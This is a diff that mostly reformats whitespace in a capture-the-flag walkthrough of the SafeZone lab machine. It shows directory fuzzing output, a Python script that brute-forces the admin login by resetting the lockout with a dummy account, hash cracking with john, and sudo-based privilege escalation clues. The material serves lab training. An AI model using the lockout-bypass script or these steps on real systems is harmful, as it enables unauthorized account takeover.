@@ -9,8 +9,8 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 22   | SSH     |
-| 80   | HTTP    |
+| 22 | SSH |
+| 80 | HTTP |
 
 
 
@@ -28,56 +28,56 @@ Seems like we need to add `safezone.thm` to `/etc/hosts`, after we add it, we ca
 ```
 ffuf -w /usr/share/dirb/wordlists/common.txt:FUZZ -u "http://safezone.thm/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://safezone.thm/FUZZ
- :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
- :: Extensions       : .php .html .txt .git
+ :: Method : GET
+ :: URL : http://safezone.thm/FUZZ
+ :: Wordlist : FUZZ: /usr/share/dirb/wordlists/common.txt
+ :: Extensions : .php .html .txt .git
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-                        [Status: 200, Size: 503, Words: 139, Lines: 24, Duration: 176ms]
-.html                   [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 176ms]
-.php                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 176ms]
-.hta.git                [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 176ms]
-.hta.php                [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 177ms]
-.htaccess.php           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 179ms]
-.hta.html               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 176ms]
-.hta.txt                [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 176ms]
-.htaccess.txt           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 176ms]
-.htaccess.html          [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 177ms]
-.htaccess.git           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 177ms]
-.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 180ms]
-.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 180ms]
-.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 188ms]
-.htpasswd.php           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1418ms]
-.htpasswd.html          [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2419ms]
-.htpasswd.txt           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2420ms]
-.htpasswd.git           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 3422ms]
-dashboard.php           [Status: 302, Size: 922, Words: 94, Lines: 58, Duration: 176ms]
-detail.php              [Status: 302, Size: 1103, Words: 99, Lines: 118, Duration: 176ms]
-index.html              [Status: 200, Size: 503, Words: 139, Lines: 24, Duration: 175ms]
-index.php               [Status: 200, Size: 2372, Words: 706, Lines: 47, Duration: 176ms]
-index.html              [Status: 200, Size: 503, Words: 139, Lines: 24, Duration: 175ms]
-index.php               [Status: 200, Size: 2372, Words: 706, Lines: 47, Duration: 182ms]
-logout.php              [Status: 200, Size: 54, Words: 1, Lines: 3, Duration: 296ms]
-news.php                [Status: 302, Size: 922, Words: 94, Lines: 58, Duration: 178ms]
-note.txt                [Status: 200, Size: 121, Words: 20, Lines: 4, Duration: 176ms]
-register.php            [Status: 200, Size: 2334, Words: 701, Lines: 46, Duration: 177ms]
-server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 176ms]
+ [Status: 200, Size: 503, Words: 139, Lines: 24, Duration: 176ms]
+.html [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 176ms]
+.php [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 176ms]
+.hta.git [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 176ms]
+.hta.php [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 177ms]
+.htaccess.php [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 179ms]
+.hta.html [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 176ms]
+.hta.txt [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 176ms]
+.htaccess.txt [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 176ms]
+.htaccess.html [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 177ms]
+.htaccess.git [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 177ms]
+.htpasswd [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 180ms]
+.hta [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 180ms]
+.htaccess [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 188ms]
+.htpasswd.php [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1418ms]
+.htpasswd.html [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2419ms]
+.htpasswd.txt [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2420ms]
+.htpasswd.git [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 3422ms]
+dashboard.php [Status: 302, Size: 922, Words: 94, Lines: 58, Duration: 176ms]
+detail.php [Status: 302, Size: 1103, Words: 99, Lines: 118, Duration: 176ms]
+index.html [Status: 200, Size: 503, Words: 139, Lines: 24, Duration: 175ms]
+index.php [Status: 200, Size: 2372, Words: 706, Lines: 47, Duration: 176ms]
+index.html [Status: 200, Size: 503, Words: 139, Lines: 24, Duration: 175ms]
+index.php [Status: 200, Size: 2372, Words: 706, Lines: 47, Duration: 182ms]
+logout.php [Status: 200, Size: 54, Words: 1, Lines: 3, Duration: 296ms]
+news.php [Status: 302, Size: 922, Words: 94, Lines: 58, Duration: 178ms]
+note.txt [Status: 200, Size: 121, Words: 20, Lines: 4, Duration: 176ms]
+register.php [Status: 200, Size: 2334, Words: 701, Lines: 46, Duration: 177ms]
+server-status [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 176ms]
 ```
 
 We got a bunch of stuff, let's read `note.txt` first:
@@ -120,18 +120,18 @@ gobuster dir -u http://safezone.thm/ -w /usr/share/seclists/Discovery/Web-Conten
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
-[+] Url:                     http://safezone.thm/
-[+] Method:                  GET
-[+] Threads:                 20
-[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Timeout:                 10s
+[+] Url: http://safezone.thm/
+[+] Method: GET
+[+] Threads: 20
+[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+[+] Negative Status codes: 404
+[+] User Agent: gobuster/3.6
+[+] Timeout: 10s
 ===============================================================
 Starting gobuster in directory enumeration mode
 ===============================================================
-/server-status        (Status: 403) [Size: 277]
-/~files               (Status: 301) [Size: 313] [--> http://safezone.thm/~files/]
+/server-status (Status: 403) [Size: 277]
+/~files (Status: 301) [Size: 313] [--> http://safezone.thm/~files/]
 ```
 
 We found the `/~files` directory, this must point to the same directory the admin was talking about on the note, let's go to `/~files/pass.txt` to check if its true:
@@ -156,62 +156,62 @@ URL = 'http://safezone.thm/index.php'
 
 # Headers copied from your curl for fidelity
 HEADERS = {
-    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-    'Accept-Language': 'en-US,en;q=0.5',
-    'Content-Type': 'application/x-www-form-urlencoded',
-    'Origin': 'http://safezone.thm',
-    'Connection': 'keep-alive',
-    'Referer': 'http://safezone.thm/index.php',
-    'Upgrade-Insecure-Requests': '1',
-    'Pragma': 'no-cache',
-    'Cache-Control': 'no-cache'
+ 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
+ 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+ 'Accept-Language': 'en-US,en;q=0.5',
+ 'Content-Type': 'application/x-www-form-urlencoded',
+ 'Origin': 'http://safezone.thm',
+ 'Connection': 'keep-alive',
+ 'Referer': 'http://safezone.thm/index.php',
+ 'Upgrade-Insecure-Requests': '1',
+ 'Pragma': 'no-cache',
+ 'Cache-Control': 'no-cache'
 }
 
 # Dummy account (resets lockout)
 DUMMY_CREDS = {
-    'username': 'test',
-    'password': 'test',
-    'submit': 'Submit'
+ 'username': 'test',
+ 'password': 'test',
+ 'submit': 'Submit'
 }
 
 # Admin fuzz template
 def admin_creds(passwd: str):
-    return {
-        'username': 'Admin',
-        'password': passwd,
-        'submit': 'Submit'
-    }
+ return {
+ 'username': 'Admin',
+ 'password': passwd,
+ 'submit': 'Submit'
+ }
 
 def main():
-    session = requests.Session()
-    session.headers.update(HEADERS)
+ session = requests.Session()
+ session.headers.update(HEADERS)
 
-    # Iterate through admin00admin â€¦ admin99admin
-    for x, y in product(range(10), repeat=2):
-        trypass = f"admin{x}{y}admin"
-        print(f"[+] Trying {trypass}â€¦", end=" ")
+ # Iterate through admin00admin â€¦ admin99admin
+ for x, y in product(range(10), repeat=2):
+ trypass = f"admin{x}{y}admin"
+ print(f"[+] Trying {trypass}â€¦", end=" ")
 
-        # 1) Reset the rateâ€limit by logging in as your test user
-        session.post(URL, data=DUMMY_CREDS, allow_redirects=True)
+ # 1) Reset the rateâ€limit by logging in as your test user
+ session.post(URL, data=DUMMY_CREDS, allow_redirects=True)
 
-        # 2) Immediately try the admin login
-        resp = session.post(URL, data=admin_creds(trypass), allow_redirects=True)
+ # 2) Immediately try the admin login
+ resp = session.post(URL, data=admin_creds(trypass), allow_redirects=True)
 
-        body = resp.text
+ body = resp.text
 
-        # Check for failure messages
-        if "Please enter valid login details" in body or "Too many failed" in body:
-            print("âœ—")
-        else:
-            print("âœ…  SUCCESS!")
-            print(f"    â†’ admin password is: {trypass}")
-            return
+ # Check for failure messages
+ if "Please enter valid login details" in body or "Too many failed" in body:
+ print("âœ—")
+ else:
+ print("âœ… SUCCESS!")
+ print(f" â†’ admin password is: {trypass}")
+ return
 
-    print("[-] Exhausted all guesses.")
+ print("[-] Exhausted all guesses.")
 
 if __name__ == "__main__":
-    main()
+ main()
 
 ```
 
@@ -263,8 +263,8 @@ python3 exploit.py
 [+] Trying admin41adminâ€¦ âœ—
 [+] Trying admin42adminâ€¦ âœ—
 [+] Trying admin43adminâ€¦ âœ—
-[+] Trying admin44adminâ€¦ âœ…  SUCCESS!
-    â†’ admin password is: admin44admin
+[+] Trying admin44adminâ€¦ âœ… SUCCESS!
+ â†’ admin password is: admin44admin
 ```
 
 
@@ -340,13 +340,13 @@ With our stable shell, we can now look around the box, for example, if we use `s
 ```
 www-data@safezone:/$ sudo -l
 Matching Defaults entries for www-data on safezone:
-    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
-    XFILESEARCHPATH XUSERFILESEARCHPATH",
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
-    mail_badpass
+ env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
+ XFILESEARCHPATH XUSERFILESEARCHPATH",
+ secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+ mail_badpass
 
 User www-data may run the following commands on safezone:
-    (files) NOPASSWD: /usr/bin/find
+ (files) NOPASSWD: /usr/bin/find
 ```
 
 On `GTFOBINS`, we can find this info on how to exploit this:
@@ -366,13 +366,13 @@ There we go, let's check our privileges again:
 ```
 files@safezone:/$ sudo -l
 Matching Defaults entries for files on safezone:
-    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
-    XFILESEARCHPATH XUSERFILESEARCHPATH",
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
-    mail_badpass
+ env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
+ XFILESEARCHPATH XUSERFILESEARCHPATH",
+ secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+ mail_badpass
 
 User files may run the following commands on safezone:
-    (yash) NOPASSWD: /usr/bin/id
+ (yash) NOPASSWD: /usr/bin/id
 ```
 
 I couldn't find any info on how to exploit this on `gtfobins`, let's leave it like that for now and proceed to check more stuff, for example, we can find this inside of `/home/files/`:
@@ -380,18 +380,18 @@ I couldn't find any info on how to exploit this on `gtfobins`, let's leave it li
 ```
 files@safezone:/$ ls -la /home/files
 total 48
-drwxrwxrwx 5 files    files    4096 May 20 07:04  .
-drwxr-xr-x 4 root     root     4096 Jan 29  2021  ..
--rw------- 1 files    files       0 Mar 29  2021  .bash_history
--rw-r--r-- 1 files    files     220 Jan 29  2021  .bash_logout
--rw-r--r-- 1 files    files    3771 Jan 29  2021  .bashrc
-drwx------ 2 files    files    4096 Jan 29  2021  .cache
-drwx------ 3 files    files    4096 Jan 29  2021  .gnupg
-drwxrwxr-x 3 files    files    4096 Jan 30  2021  .local
--rw-r--r-- 1 files    files     807 Jan 29  2021  .profile
--rw-r--r-- 1 root     root      105 Jan 29  2021 '.something#fake_can@be^here'
--rwxrwxrwx 1 root     root      112 Jan 29  2021  pass.txt
--rw-r--r-- 1 www-data www-data 5493 May 20 06:39  rev.ph
+drwxrwxrwx 5 files files 4096 May 20 07:04 .
+drwxr-xr-x 4 root root 4096 Jan 29 2021 ..
+-rw------- 1 files files 0 Mar 29 2021 .bash_history
+-rw-r--r-- 1 files files 220 Jan 29 2021 .bash_logout
+-rw-r--r-- 1 files files 3771 Jan 29 2021 .bashrc
+drwx------ 2 files files 4096 Jan 29 2021 .cache
+drwx------ 3 files files 4096 Jan 29 2021 .gnupg
+drwxrwxr-x 3 files files 4096 Jan 30 2021 .local
+-rw-r--r-- 1 files files 807 Jan 29 2021 .profile
+-rw-r--r-- 1 root root 105 Jan 29 2021 '.something#fake_can@be^here'
+-rwxrwxrwx 1 root root 112 Jan 29 2021 pass.txt
+-rw-r--r-- 1 www-data www-data 5493 May 20 06:39 rev.ph
 ```
 
 
@@ -406,7 +406,7 @@ We got a hash, let's crack it using john:
 
 ```
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
-magic            (?)
+magic (?)
 ```
 
 We got the credentials, let's switch to ssh:
@@ -431,42 +431,42 @@ It says forbidden but we can still fuzz, let's do it:
 ```
 ffuf -w /usr/share/dirb/wordlists/common.txt:FUZZ -u "http://localhost:9000/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://localhost:9000/FUZZ
- :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
- :: Extensions       : .php .html .txt .git
+ :: Method : GET
+ :: URL : http://localhost:9000/FUZZ
+ :: Wordlist : FUZZ: /usr/share/dirb/wordlists/common.txt
+ :: Extensions : .php .html .txt .git
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-.html                   [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 531ms]
-.hta                    [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 546ms]
-.hta.git                [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 547ms]
-.hta.txt                [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 547ms]
-.hta.html               [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 547ms]
-.htpasswd.txt           [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 546ms]
-.htaccess               [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 546ms]
-.htpasswd.html          [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 547ms]
-.htpasswd               [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 694ms]
-.htaccess.git           [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 694ms]
-.htaccess.txt           [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 694ms]
-.htpasswd.git           [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 704ms]
-.htaccess.html          [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 874ms]
-cgi-bin/.html           [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 175ms]
-login.html              [Status: 200, Size: 462, Words: 21, Lines: 19, Duration: 176ms]
+.html [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 531ms]
+.hta [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 546ms]
+.hta.git [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 547ms]
+.hta.txt [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 547ms]
+.hta.html [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 547ms]
+.htpasswd.txt [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 546ms]
+.htaccess [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 546ms]
+.htpasswd.html [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 547ms]
+.htpasswd [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 694ms]
+.htaccess.git [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 694ms]
+.htaccess.txt [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 694ms]
+.htpasswd.git [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 704ms]
+.htaccess.html [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 874ms]
+cgi-bin/.html [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 175ms]
+login.html [Status: 200, Size: 462, Words: 21, Lines: 19, Duration: 176ms]
 ```
 
 
@@ -543,13 +543,13 @@ If we check our privileges, we can check this:
 ```
 yash@safezone:/opt$ sudo -l
 Matching Defaults entries for yash on safezone:
-    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
-    XFILESEARCHPATH XUSERFILESEARCHPATH",
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
-    mail_badpass
+ env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
+ XFILESEARCHPATH XUSERFILESEARCHPATH",
+ secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+ mail_badpass
 
 User yash may run the following commands on safezone:
-    (root) NOPASSWD: /usr/bin/python3 /root/bk.py
+ (root) NOPASSWD: /usr/bin/python3 /root/bk.py
 ```
 
 We can run that script as root, let's use it first to check how it works:
@@ -560,16 +560,16 @@ Enter filename:
 Enter destination:
 Enter Password:
 Usage: sshpass [-f|-d|-p|-e] [-hV] command parameters
-   -f filename   Take password to use from file
-   -d number     Use number as file descriptor for getting password
-   -p password   Provide password as argument (security unwise)
-   -e            Password is passed as env-var "SSHPASS"
-   With no parameters - password will be taken from stdin
+ -f filename Take password to use from file
+ -d number Use number as file descriptor for getting password
+ -p password Provide password as argument (security unwise)
+ -e Password is passed as env-var "SSHPASS"
+ With no parameters - password will be taken from stdin
 
-   -P prompt     Which string should sshpass search for to detect a password prompt
-   -v            Be verbose about what you're doing
-   -h            Show help (this screen)
-   -V            Print version information
+ -P prompt Which string should sshpass search for to detect a password prompt
+ -v Be verbose about what you're doing
+ -h Show help (this screen)
+ -V Print version information
 At most one of -f, -d, -p or -e should be used
 yash@safezone:/opt$
 ```
